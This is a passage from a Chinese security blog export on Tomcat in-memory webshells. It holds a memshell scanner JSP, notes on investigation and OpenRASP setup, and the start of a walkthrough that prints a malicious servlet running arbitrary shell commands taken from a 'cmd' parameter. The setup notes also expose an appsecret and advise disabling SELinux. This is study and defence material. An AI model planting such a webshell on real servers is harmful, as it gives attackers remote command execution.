standardContext.getClass().getDeclaredMethod(\u0026#34;removeChild\u0026#34;, new Class[]{org.apache.catalina.Container.class}); removeChild.setAccessible(true); removeChild.invoke(standardContext, objChild); } } public synchronized HashMap\u0026lt;String, Object\u0026gt; getChildren(HttpServletRequest request) throws Exception { Object standardContext = getStandardContext(request); Field _children = standardContext.getClass().getSuperclass().getDeclaredField(\u0026#34;children\u0026#34;); _children.setAccessible(true); HashMap\u0026lt;String, Object\u0026gt; children = (HashMap\u0026lt;String, Object\u0026gt;) _children.get(standardContext); return children; } public synchronized HashMap\u0026lt;String, String\u0026gt; getServletMaps(HttpServletRequest request) throws Exception { Object standardContext = getStandardContext(request); Field _servletMappings = standardContext.getClass().getDeclaredField(\u0026#34;servletMappings\u0026#34;); _servletMappings.setAccessible(true); HashMap\u0026lt;String, String\u0026gt; servletMappings = (HashMap\u0026lt;String, String\u0026gt;) _servletMappings.get(standardContext); return servletMappings; } public synchronized List\u0026lt;Object\u0026gt; getListenerList(HttpServletRequest request) throws Exception { Object standardContext = getStandardContext(request); Field _listenersList = standardContext.getClass().getDeclaredField(\u0026#34;applicationEventListenersList\u0026#34;); _listenersList.setAccessible(true); List\u0026lt;Object\u0026gt; listenerList = (CopyOnWriteArrayList) _listenersList.get(standardContext); return listenerList; } public String getFilterName(Object filterMap) throws Exception { Method getFilterName = filterMap.getClass().getDeclaredMethod(\u0026#34;getFilterName\u0026#34;); getFilterName.setAccessible(true); return (String) getFilterName.invoke(filterMap, null); } public String[] getURLPatterns(Object filterMap) throws Exception { Method getFilterName = filterMap.getClass().getDeclaredMethod(\u0026#34;getURLPatterns\u0026#34;); getFilterName.setAccessible(true); return (String[]) getFilterName.invoke(filterMap, null); } String classFileIsExists(Class clazz) { if (clazz == null) { return \u0026#34;class is null\u0026#34;; } String className = clazz.getName(); String classNamePath = className.replace(\u0026#34;.\u0026#34;, \u0026#34;/\u0026#34;) + \u0026#34;.class\u0026#34;; URL is = clazz.getClassLoader().getResource(classNamePath); if (is == null) { return \u0026#34;åœ¨ç£ç›˜ä¸Šæ²¡æœ‰å¯¹åº”classæ–‡ä»¶ï¼Œå¯èƒ½æ˜¯å†…å­˜é©¬\u0026#34;; } else { return is.getPath(); } } String arrayToString(String[] str) { String res = \u0026#34;[\u0026#34;; for (String s : str) { res += String.format(\u0026#34;%s,\u0026#34;, s); } res = res.substring(0, res.length() - 1); res += \u0026#34;]\u0026#34;; return res; } %\u0026gt; \u0026lt;% out.write(\u0026#34;\u0026lt;h2\u0026gt;Tomcat memshell scanner 0.1.0\u0026lt;/h2\u0026gt;\u0026#34;); String action = request.getParameter(\u0026#34;action\u0026#34;); String filterName = request.getParameter(\u0026#34;filterName\u0026#34;); String servletName = request.getParameter(\u0026#34;servletName\u0026#34;); String className = request.getParameter(\u0026#34;className\u0026#34;); if (action != null \u0026amp;\u0026amp; action.equals(\u0026#34;kill\u0026#34;) \u0026amp;\u0026amp; filterName != null) { deleteFilter(request, filterName); } else if (action != null \u0026amp;\u0026amp; action.equals(\u0026#34;kill\u0026#34;) \u0026amp;\u0026amp; servletName != null) { deleteServlet(request, servletName); } else if (action != null \u0026amp;\u0026amp; action.equals(\u0026#34;dump\u0026#34;) \u0026amp;\u0026amp; className != null) { byte[] classBytes = Repository.lookupClass(Class.forName(className)).getBytes(); response.addHeader(\u0026#34;content-Type\u0026#34;, \u0026#34;application/octet-stream\u0026#34;); String filename = Class.forName(className).getSimpleName() + \u0026#34;.class\u0026#34;; String agent = request.getHeader(\u0026#34;User-Agent\u0026#34;); if (agent.toLowerCase().indexOf(\u0026#34;chrome\u0026#34;) \u0026gt; 0) { response.addHeader(\u0026#34;content-Disposition\u0026#34;, \u0026#34;attachment;filename=\u0026#34; + new String(filename.getBytes(\u0026#34;UTF-8\u0026#34;), \u0026#34;ISO8859-1\u0026#34;)); } else { response.addHeader(\u0026#34;content-Disposition\u0026#34;, \u0026#34;attachment;filename=\u0026#34; + URLEncoder.encode(filename, \u0026#34;UTF-8\u0026#34;)); } ServletOutputStream outDumper = response.getOutputStream(); outDumper.write(classBytes, 0, classBytes.length); outDumper.close(); } else { // Scan filter  out.write(\u0026#34;\u0026lt;h4\u0026gt;Filter scan result\u0026lt;/h4\u0026gt;\u0026#34;); out.write(\u0026#34;\u0026lt;table border=\\\u0026#34;1\\\u0026#34; cellspacing=\\\u0026#34;0\\\u0026#34; width=\\\u0026#34;95%\\\u0026#34; style=\\\u0026#34;table-layout:fixed;word-break:break-all;background:#f2f2f2\\\u0026#34;\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;thead\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;5%\\\u0026#34;\u0026gt;ID\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;10%\\\u0026#34;\u0026gt;Filter name\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;10%\\\u0026#34;\u0026gt;Patern\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;20%\\\u0026#34;\u0026gt;Filter class\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;20%\\\u0026#34;\u0026gt;Filter classLoader\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;25%\\\u0026#34;\u0026gt;Filter class file path\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;5%\\\u0026#34;\u0026gt;dump class\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;5%\\\u0026#34;\u0026gt;kill\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;/thead\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;tbody\u0026gt;\u0026#34;); HashMap\u0026lt;String, Object\u0026gt; filterConfigs = getFilterConfig(request); Object[] filterMaps1 = getFilterMaps(request); for (int i = 0; i \u0026lt; filterMaps1.length; i++) { out.write(\u0026#34;\u0026lt;tr\u0026gt;\u0026#34;); Object fm = filterMaps1[i]; Object appFilterConfig = filterConfigs.get(getFilterName(fm)); if (appFilterConfig == null) { continue; } Field _filter = appFilterConfig.getClass().getDeclaredField(\u0026#34;filter\u0026#34;); _filter.setAccessible(true); Object filter = _filter.get(appFilterConfig); String filterClassName = filter.getClass().getName(); String filterClassLoaderName = filter.getClass().getClassLoader().getClass().getName(); // ID Filtername åŒ¹é…è·¯å¾„ className classLoader æ˜¯å¦å­˜åœ¨file dump kill  out.write(String.format(\u0026#34;\u0026lt;td style=\\\u0026#34;text-align:center\\\u0026#34;\u0026gt;%d\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;%s\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;%s\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;%s\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;%s\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;%s\u0026lt;/td\u0026gt;\u0026lt;td style=\\\u0026#34;text-align:center\\\u0026#34;\u0026gt;\u0026lt;a href=\\\u0026#34;?action=dump\u0026amp;className=%s\\\u0026#34;\u0026gt;dump\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;td style=\\\u0026#34;text-align:center\\\u0026#34;\u0026gt;\u0026lt;a href=\\\u0026#34;?action=kill\u0026amp;filterName=%s\\\u0026#34;\u0026gt;kill\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026#34; , i + 1 , getFilterName(fm) , arrayToString(getURLPatterns(fm)) , filterClassName , filterClassLoaderName , classFileIsExists(filter.getClass()) , filterClassName , getFilterName(fm))); out.write(\u0026#34;\u0026lt;/tr\u0026gt;\u0026#34;); } out.write(\u0026#34;\u0026lt;/tbody\u0026gt;\u0026lt;/table\u0026gt;\u0026#34;); // Scan servlet  out.write(\u0026#34;\u0026lt;h4\u0026gt;Servlet scan result\u0026lt;/h4\u0026gt;\u0026#34;); out.write(\u0026#34;\u0026lt;table border=\\\u0026#34;1\\\u0026#34; cellspacing=\\\u0026#34;0\\\u0026#34; width=\\\u0026#34;95%\\\u0026#34; style=\\\u0026#34;table-layout:fixed;word-break:break-all;background:#f2f2f2\\\u0026#34;\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;thead\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;5%\\\u0026#34;\u0026gt;ID\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;10%\\\u0026#34;\u0026gt;Servlet name\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;10%\\\u0026#34;\u0026gt;Patern\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;20%\\\u0026#34;\u0026gt;Servlet class\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;20%\\\u0026#34;\u0026gt;Servlet classLoader\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;25%\\\u0026#34;\u0026gt;Servlet class file path\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;5%\\\u0026#34;\u0026gt;dump class\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;5%\\\u0026#34;\u0026gt;kill\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;/thead\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;tbody\u0026gt;\u0026#34;); HashMap\u0026lt;String, Object\u0026gt; children = getChildren(request); Map\u0026lt;String, String\u0026gt; servletMappings = getServletMaps(request); int servletId = 0; for (Map.Entry\u0026lt;String, String\u0026gt; map : servletMappings.entrySet()) { String servletMapPath = map.getKey(); String servletName1 = map.getValue(); StandardWrapper wrapper = (StandardWrapper) children.get(servletName1); Class servletClass = null; try { servletClass = Class.forName(wrapper.getServletClass()); } catch (Exception e) { Object servlet = wrapper.getServlet(); if (servlet != null) { servletClass = servlet.getClass(); } } if (servletClass != null) { out.write(\u0026#34;\u0026lt;tr\u0026gt;\u0026#34;); String servletClassName = servletClass.getName(); String servletClassLoaderName = null; try { servletClassLoaderName = servletClass.getClassLoader().getClass().getName(); } catch (Exception e) { } out.write(String.format(\u0026#34;\u0026lt;td style=\\\u0026#34;text-align:center\\\u0026#34;\u0026gt;%d\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;%s\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;%s\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;%s\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;%s\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;%s\u0026lt;/td\u0026gt;\u0026lt;td style=\\\u0026#34;text-align:center\\\u0026#34;\u0026gt;\u0026lt;a href=\\\u0026#34;?action=dump\u0026amp;className=%s\\\u0026#34;\u0026gt;dump\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;td style=\\\u0026#34;text-align:center\\\u0026#34;\u0026gt;\u0026lt;a href=\\\u0026#34;?action=kill\u0026amp;servletName=%s\\\u0026#34;\u0026gt;kill\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026#34; , servletId + 1 , servletName1 , servletMapPath , servletClassName , servletClassLoaderName , classFileIsExists(servletClass) , servletClassName , servletName1)); out.write(\u0026#34;\u0026lt;/tr\u0026gt;\u0026#34;); } servletId++; } out.write(\u0026#34;\u0026lt;/tbody\u0026gt;\u0026lt;/table\u0026gt;\u0026#34;); List\u0026lt;Object\u0026gt; listeners = getListenerList(request); if (listeners == null || listeners.size() == 0) { return; } out.write(\u0026#34;\u0026lt;tbody\u0026gt;\u0026#34;); List\u0026lt;ServletRequestListener\u0026gt; newListeners = new ArrayList\u0026lt;\u0026gt;(); for (Object o : listeners) { if (o instanceof ServletRequestListener) { newListeners.add((ServletRequestListener) o); } } // Scan listener  out.write(\u0026#34;\u0026lt;h4\u0026gt;Listener scan result\u0026lt;/h4\u0026gt;\u0026#34;); out.write(\u0026#34;\u0026lt;table border=\\\u0026#34;1\\\u0026#34; cellspacing=\\\u0026#34;0\\\u0026#34; width=\\\u0026#34;95%\\\u0026#34; style=\\\u0026#34;table-layout:fixed;word-break:break-all;background:#f2f2f2\\\u0026#34;\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;thead\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;5%\\\u0026#34;\u0026gt;ID\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;20%\\\u0026#34;\u0026gt;Listener class\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;30%\\\u0026#34;\u0026gt;Listener classLoader\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;35%\\\u0026#34;\u0026gt;Listener class file path\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;5%\\\u0026#34;\u0026gt;dump class\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;5%\\\u0026#34;\u0026gt;kill\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;/thead\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;tbody\u0026gt;\u0026#34;); int index = 0; for (ServletRequestListener listener : newListeners) { out.write(\u0026#34;\u0026lt;tr\u0026gt;\u0026#34;); out.write(String.format(\u0026#34;\u0026lt;td style=\\\u0026#34;text-align:center\\\u0026#34;\u0026gt;%d\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;%s\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;%s\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;%s\u0026lt;/td\u0026gt;\u0026lt;td style=\\\u0026#34;text-align:center\\\u0026#34;\u0026gt;\u0026lt;a href=\\\u0026#34;?action=dump\u0026amp;className=%s\\\u0026#34;\u0026gt;dump\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;td style=\\\u0026#34;text-align:center\\\u0026#34;\u0026gt;\u0026lt;a href=\\\u0026#34;?action=kill\u0026amp;servletName=%s\\\u0026#34;\u0026gt;kill\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026#34; , index + 1 , listener.getClass().getName() , listener.getClass().getClassLoader() , classFileIsExists(listener.getClass()) , listener.getClass().getName() , listener.getClass().getName())); out.write(\u0026#34;\u0026lt;/tr\u0026gt;\u0026#34;); index++; } out.write(\u0026#34;\u0026lt;/tbody\u0026gt;\u0026lt;/table\u0026gt;\u0026#34;); } %\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;br/\u0026gt; code by c0ny1 \u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   å†…å­˜é©¬æ’æŸ¥ å¦‚æœæ˜¯jspæ³¨å…¥ï¼Œæ—¥å¿—ä¸­æ’æŸ¥å¯ç–‘jspçš„è®¿é—®è¯·æ±‚\næ ¹æ®ä¸šåŠ¡ä½¿ç”¨çš„ç»„ä»¶æ’æŸ¥æ˜¯å¦å¯èƒ½å­˜åœ¨javaä»£ç æ‰§è¡Œæ¼æ´ä»¥åŠæ˜¯å¦å­˜åœ¨è¿‡webshellï¼Œæ’æŸ¥æ¡†æ¶æ¼æ´ï¼Œååºåˆ—åŒ–æ¼æ´ã€‚\nå¦‚æœæ˜¯ä»£ç æ‰§è¡Œæ¼æ´ï¼Œæ’æŸ¥ä¸­é—´ä»¶çš„error.logï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰å¯ç–‘çš„æŠ¥é”™ï¼Œåˆ¤æ–­æ³¨å…¥æ—¶é—´å’Œæ–¹æ³•\nå¦‚æœæ˜¯servletæˆ–è€…springçš„controllerç±»å‹ï¼Œæ ¹æ®ä¸ŠæŠ¥çš„webshellçš„urlæŸ¥æ‰¾æ—¥å¿—ï¼ˆæ—¥å¿—å¯èƒ½è¢«å…³é—­ï¼Œä¸ä¸€å®šæœ‰ï¼‰ï¼Œæ ¹æ®urlæœ€æ—©è®¿é—®æ—¶é—´ç¡®å®šè¢«æ³¨å…¥æ—¶é—´ã€‚\nå¦‚æœæ˜¯filteræˆ–è€…listenerç±»å‹ï¼Œå¯èƒ½ä¼šæœ‰è¾ƒå¤šçš„404ä½†æ˜¯å¸¦æœ‰å‚æ•°çš„è¯·æ±‚ï¼Œæˆ–è€…å¤§é‡è¯·æ±‚ä¸åŒurlä½†å¸¦æœ‰ç›¸åŒçš„å‚æ•°ï¼Œæˆ–è€…é¡µé¢å¹¶ä¸å­˜åœ¨ä½†è¿”å›200\nArthas æ’æŸ¥ 1 2 3  java -jar arthas-boot.jar sc *servlet jad --source-only com.example.xxx   æ•´ä½“æ¼”ç¤º \u0026ldquo;http://{ip}:{port}/{waråŒ…åç§°}/{è®¿é—®çš„é»˜è®¤é¦–é¡µ}\u0026rdquo;\næ‰“åŒ…éƒ¨ç½²åˆ°Tomcat Centoså®‰è£…Tomcat 1 2  yum -y install tomcat systemctl start/stop/status tomcat    å®‰è£…è·¯å¾„ï¼š /usr/share/tomcat é…ç½®è·¯å¾„:ï¼š/etc/tomcat/ æ’é”™æ—¥å¿—ï¼š /usr/share/tomcat/logs/catalina.*.log  éƒ¨ç½²waråŒ… ä¸Šä¼ waråŒ…åˆ°/usr/share/tomcat/webapps\n1  scp TomcatServletShell-1.0-SNAPSHOT.war rasp:/usr/share/tomcat/webapps   é…ç½®openrasp æ–‡ç« çš„éƒ¨åˆ†å†…å®¹è¢«å¯†ç ä¿æŠ¤ï¼š\n  --- DON'T MODIFY THIS LINE ---  ä¸‹è½½Java Agentå®‰è£…åŒ…  1 2 3  curl https://packages.baidu.com/app/openrasp/release/1.3.7/rasp-java.tar.gz -o rasp-java.tar.gz tar -xvf rasp-java.tar.gz cd rasp-*/   æ‰§è¡ŒRaspInstallè¿›è¡Œå®‰è£…\nè¯·å…ˆæ›¿æ¢ /path/to/tomcat ä¸ºä½ çš„æœåŠ¡å™¨è·¯å¾„ï¼Œå†æ‰§è¡Œå‘½ä»¤å®‰è£…  1  java -jar RaspInstall.jar -heartbeat 90 -appid 6e009cc2caf116635581b17a7872a88940ed2b70 -appsecret qLAra0wyLZGabX9KrBry7bR0goHiStXTz910Q5vbNoa -backendurl http://127.0.0.1:8086/ -install /usr/share/tomcat/   é‡å¯ Tomcat/JBoss/WebLogic/SpringBoot åº”ç”¨æœåŠ¡å™¨  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  systemctl restart tomcat systemctl status tomcat â— tomcat.service - Apache Tomcat Web Application Container Loaded: loaded (/usr/lib/systemd/system/tomcat.service; disabled; vendor preset: disabled) Active: active (running) since Wed 2022-07-20 10:43:42 UTC; 40s ago Main PID: 16583 (java) Tasks: 42 Memory: 109.8M CGroup: /system.slice/tomcat.service â””â”€16583 /usr/lib/jvm/jre/bin/java -javaagent:/usr/share/tomcat/rasp/rasp.jar -javaagent:/usr/share/tomcat/rasp/rasp.jar -classpath /usr/share/tomcat/bin/bootstrap.jar:/us... Jul 20 10:43:43 ip-172-31-32-181.ap-northeast-1.compute.internal server[16583]: Jul 20, 2022 10:43:43 AM org.apache.catalina.core.StandardService startInternal Jul 20 10:43:43 ip-172-31-32-181.ap-northeast-1.compute.internal server[16583]: INFO: Starting service Catalina Jul 20 10:43:43 ip-172-31-32-181.ap-northeast-1.compute.internal server[16583]: Jul 20, 2022 10:43:43 AM org.apache.catalina.core.StandardEngine startInternal Jul 20 10:43:43 ip-172-31-32-181.ap-northeast-1.compute.internal server[16583]: INFO: Starting Servlet Engine: Apache Tomcat/7.0.76 Jul 20 10:43:43 ip-172-31-32-181.ap-northeast-1.compute.internal server[16583]: Jul 20, 2022 10:43:43 AM org.apache.coyote.AbstractProtocol start Jul 20 10:43:43 ip-172-31-32-181.ap-northeast-1.compute.internal server[16583]: INFO: Starting ProtocolHandler [\u0026#34;http-bio-8080\u0026#34;] Jul 20 10:43:43 ip-172-31-32-181.ap-northeast-1.compute.internal server[16583]: Jul 20, 2022 10:43:43 AM org.apache.coyote.AbstractProtocol start Jul 20 10:43:43 ip-172-31-32-181.ap-northeast-1.compute.internal server[16583]: INFO: Starting ProtocolHandler [\u0026#34;ajp-bio-8009\u0026#34;] Jul 20 10:43:43 ip-172-31-32-181.ap-northeast-1.compute.internal server[16583]: Jul 20, 2022 10:43:43 AM org.apache.catalina.startup.Catalina start Jul 20 10:43:43 ip-172-31-32-181.ap-northeast-1.compute.internal server[16583]: INFO: Server startup in 41 ms   æ’é”™\næŸ¥çœ‹ /usr/share/tomcat/logs/catalina.2022-07-20.logå‘ç°å¦‚ä¸‹é”™è¯¯ï¼š  java.lang.UnsatisfiedLinkError: /var/cache/tomcat/temp/nativelib-loader_4485267645656510327/Classloader.1658314629304.0/libopenrasp_v8_java.so: /var/cache/tomcat/temp/nativelib-loader_4485267645656510327/Classloader.1658314629304.0/libopenrasp_v8_java.so: failed to map segment from shared object: Permission denied\né—®äº†@c0de::bre@k å¤§ä½¬ï¼Œæ˜¯å¼€å¯SElinuxçš„åŸå› \n1  /usr/sbin/sestatus -v # æŸ¥çœ‹selinuxçŠ¶æ€   æ¥ä¸‹æ¥éœ€è¦å…³é—­SELinuxå†…æ ¸ï¼Œæ‰“å¼€selinuxé…ç½®æ–‡ä»¶ï¼Œ\ncd /etc/selinux/config\næ‰“å¼€configé…ç½®æ–‡ä»¶ä»¥åï¼Œæ‰¾åˆ°SELINUX=enforcingï¼Œå°†å…¶æ”¹ä¸ºSELINUX=disabled , é‡å¯\n# Tomcatå®¹å™¨æ”»é˜²ç¬”è®°ä¹‹Listenerå†…å­˜é©¬\n ","description":"","id":30,"section":"dso","tags":null,"title":"Tomcatçš„Linstenerå‹å†…å­˜é©¬ç ”ç©¶","uri":"http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/tomcat%E7%9A%84linstener%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B6/"},{"content":"Beijing: â˜€ï¸ ğŸŒ¡ï¸+33Â°C ğŸŒ¬ï¸â†‘15km/h\nç›®å‰Javaå†…å­˜é©¬çš„å…¨æµç¨‹å·²ç»æœ‰å®Œå–„çš„è§£å†³æ–¹æ¡ˆäº†ï¼š\n ç¬¬ä¸€æ­¥ï¼Œè·å–å½“å‰è¯·æ±‚çš„HttpRequestå¯¹è±¡æˆ–tomcatçš„StandardContextå¯¹è±¡(Weblogicä¸‹æ˜¯ServletContextå¯¹è±¡)ï¼ŒSpringMVCå’ŒSpringBootä¸‹æ³¨å…¥controllerå’Œinterceptoråˆ™æ˜¯è·å–åˆ°WebApplicationContextå¯¹è±¡ã€‚ ç¬¬äºŒæ­¥ï¼Œåˆ›å»ºservletã€filteræˆ–controllerç­‰æ¶æ„å¯¹è±¡ ç¬¬ä¸‰æ­¥ï¼Œä½¿ç”¨å„ç±»contextå¯¹è±¡çš„å„ç§æ–¹æ³•ï¼Œå‘ä¸­é—´ä»¶æˆ–æ¡†æ¶åŠ¨æ€æ·»åŠ servletã€filteræˆ–controllerç­‰æ¶æ„å¯¹è±¡ï¼Œå®Œæˆå†…å­˜é©¬çš„æ³¨å…¥  å‘å„ç§ä¸­é—´ä»¶å’Œæ¡†æ¶æ³¨å…¥å†…å­˜é©¬çš„åŸºç¡€ï¼Œå°±æ˜¯è¦è·å¾—contextï¼Œæ‰€è°“contextå®é™…ä¸Šå°±æ˜¯æ‹¥æœ‰å½“å‰ä¸­é—´ä»¶æˆ–æ¡†æ¶å¤„ç†è¯·æ±‚ã€ä¿å­˜å’Œæ§åˆ¶servletå¯¹è±¡ã€ä¿å­˜å’Œæ§åˆ¶filterå¯¹è±¡ç­‰åŠŸèƒ½çš„å¯¹è±¡ã€‚\nä½¿ç”¨æ–°å¢servletçš„æ–¹å¼å°±éœ€è¦ç»‘å®šæŒ‡å®šçš„URLï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦æ›´åŠ éšè”½ï¼Œåšåˆ°å†…å­˜é©¬ä¸URLæ— å…³ï¼Œ\né‚£å°±å¾—é€šè¿‡æ³¨å…¥æ–°çš„æˆ–ä¿®æ”¹å·²æœ‰çš„filteræˆ–è€…listenerçš„æ–¹å¼æ¥å®ç°äº†ã€‚\nTomcatçš„servletAPIå‹å†…å­˜é©¬ç ”ç©¶ ä»¥tomcatçš„servletAPIå‹å†…å­˜é©¬ä¸ºä¾‹è®²ä¸€ä¸‹å†…å­˜é©¬çš„å®ç°\nå…ˆæ˜¯åˆ›å»ºäº†ä¸€ä¸ªæ¶æ„çš„servlet\nç„¶åè·å–å½“å‰çš„StandardContext\nç„¶åå°†æ¶æ„servletå°è£…æˆwrapperæ·»åŠ åˆ°StandardContextçš„childrenå½“ä¸­\næœ€åæ·»åŠ ServletMappingå°†è®¿é—®çš„URLå’Œwrapperè¿›è¡Œç»‘å®šã€‚\nåˆ›å»ºæ¶æ„çš„Servletç±» 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63  \u0026lt;%-- Created by IntelliJ IDEA. User: ding.fugui Date: 7/20/22 Time: 11:34 To change this template use File | Settings | File Templates. --%\u0026gt; \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.IOException\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.InputStream\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.util.Scanner\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.StandardContext\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.PrintWriter\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.StandardEngine\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.util.HashMap\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.StandardHost\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.util.Iterator\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.lang.reflect.Field\u0026#34;%\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Memshell\u0026lt;/title\u0026gt; \u0026lt;p\u0026gt;ä»¥tomcatçš„servletAPIå‹å†…å­˜é©¬ä¸ºä¾‹è®²ä¸€ä¸‹å†…å­˜é©¬çš„å®ç°\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;å…ˆæ˜¯åˆ›å»ºäº†ä¸€ä¸ªæ¶æ„çš„servletï¼Œ\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;ç„¶åè·å–å½“å‰çš„StandardContextï¼Œ\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;ç„¶åå°†æ¶æ„servletå°è£…æˆwrapperæ·»åŠ åˆ°StandardContextçš„childrenå½“ä¸­\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;æœ€åæ·»åŠ ServletMappingå°†è®¿é—®çš„URLå’Œwrapperè¿›è¡Œç»‘å®šã€‚\u0026lt;/p\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;% // åˆ›å»ºæ¶æ„Serlvet  Servlet servlet= new Servlet(){ @Override public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException,IOException{ String cmd = servletRequest.getParameter(\u0026#34;cmd\u0026#34;); boolean isLinux=true; String osType = System.getProperty(\u0026#34;os.name\u0026#34;); if(osType !=null \u0026amp;\u0026amp; osType.toLowerCase().contains(\u0026#34;win\u0026#34;)){ isLinux=false; } String[] cmds=isLinux ? new String[]{\u0026#34;sh\u0026#34;, \u0026#34;-c\u0026#34;, cmd} : new String[]{\u0026#34;cmd.exe\u0026#34;,\u0026#34;/c\u0026#34;,cmd}; InputStream inputStream = Runtime.getRuntime().exec(cmds).getInputStream(); Scanner scanner = new Scanner(inputStream).useDelimiter(\u0026#34;\\\\a\u0026#34;); String output =scanner.hasNext()? scanner.next() : \u0026#34;\u0026#34;; PrintWriter out = response.getWriter(); out.println(output); out.flush(); out.close(); } @Override public void init(ServletConfig servletConfig) throws ServletException{} @Override public ServletConfig getServletConfig(){return null;} @Override public String getServletInfo(){return null;} @Override public void destroy(){} }; %\u0026gt;   è·å–å½“å‰çš„StandardContext 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133  \u0026lt;% // 